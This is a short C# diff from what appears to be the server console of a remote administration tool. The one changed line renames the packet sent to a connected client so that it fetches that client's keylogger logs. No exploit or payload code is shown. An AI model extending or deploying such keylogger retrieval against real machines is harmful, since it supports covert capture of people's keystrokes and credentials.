@@ -52,7 +52,7 @@ namespace xServer.Forms
             btnGetLogs.Enabled = false;
             lstLogs.Items.Clear();
 
-            new Core.Packets.ServerPackets.GetLogs().Execute(_connectClient);
+            new Core.Packets.ServerPackets.GetKeyloggerLogs().Execute(_connectClient);
         }
 
         private void lstLogs_ItemActivate(object sender, EventArgs e)
